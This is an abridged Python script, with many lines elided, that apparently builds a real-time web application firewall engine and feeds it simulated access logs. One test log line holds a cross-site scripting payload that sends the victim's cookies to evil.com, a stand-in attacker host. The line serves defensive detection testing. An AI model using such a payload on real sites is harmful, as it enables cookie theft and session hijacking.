# Create the real-time WAF API and log ingestion system
...
class WAFRealTimeEngine:
    ...
    def _analyze_request(self, request_data):
        ...
        try:
            ...
            print(f"Error analyzing request {request_data['id']}: {e}")
...
test_logs_realtime = [
    ...
    '10.0.0.2 - - [26/Sep/2025:19:17:12 +0000] "GET /search?q=<script>document.location=\\'http://evil.com\\'+document.cookie</script> HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (compatible; bot)"',
...
# Process requests one by one with small delays
request_ids = []
for i, log in enumerate(test_logs_realtime):
    ...
    time.sleep(0.1)  # Small delay to simulate real-time ingestion
...
# Export recent data to CSV for analysis
print(f"\n📄 Exporting data...")
...
print(f"   Database: {waf_engine.conn.execute('SELECT COUNT(*) FROM requests').fetchone()[0]} requests stored")